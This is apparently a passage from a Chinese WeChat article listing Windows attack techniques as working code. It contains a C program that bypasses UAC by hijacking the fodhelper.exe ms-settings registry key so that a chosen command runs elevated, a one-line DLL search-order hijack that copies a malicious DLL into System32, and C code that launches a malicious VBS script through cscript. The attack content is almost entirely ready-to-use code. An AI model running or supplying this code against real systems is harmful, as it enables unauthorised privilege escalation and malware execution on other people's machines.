        // Create a registry key to hijack the fodhelper.exe behavior    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {        printf("Failed to create registry key.\n");        return 1;    }  
        // Set the default value of the key to the command we want to execute    if (RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, sizeof(cmd)) != ERROR_SUCCESS) {        printf("Failed to set registry value.\n");        RegCloseKey(hKey);        return 1;    }  
        // Execute fodhelper.exe, which will now launch our command with elevated privileges    system("C:\\Windows\\System32\\fodhelper.exe");  
        // Cleanup: Remove the registry key to restore original behavior    RegDeleteKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");  
        printf("UAC bypass attempted using fodhelper.exe.\n");    return 0;}

 **34\. DLL Search Order Hijacking**

  * 

    
    
     copy malicious.dll C:\Windows\System32\

 **35\. 恶意脚本执行**

  * 

    
    
     cscript.exe malicious.vbs

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    STARTUPINFO si;    PROCESS_INFORMATION pi;  
        ZeroMemory(&si, sizeof(si));    si.cb = sizeof(si);    ZeroMemory(&pi, sizeof(pi));  
        // Path to the malicious VBS script    char scriptPath[] = "C:\\path\\to\\malicious.vbs";  
        // Construct the command to execute the VBS script using cscript.exe    char command[256];    snprintf(command, sizeof(command), "cscript.exe %s", scriptPath);  
        // Execute the VBS script    if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {        printf("Failed to execute script. Error: %d\n", GetLastError());        return 1;    }  
        // Wait for the script to complete    WaitForSingleObject(pi.hProcess, INFINITE);  
        // Cleanup    CloseHandle(pi.hProcess);    CloseHandle(pi.hThread);  
        printf("Script executed successfully.\n");    return 0;}

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

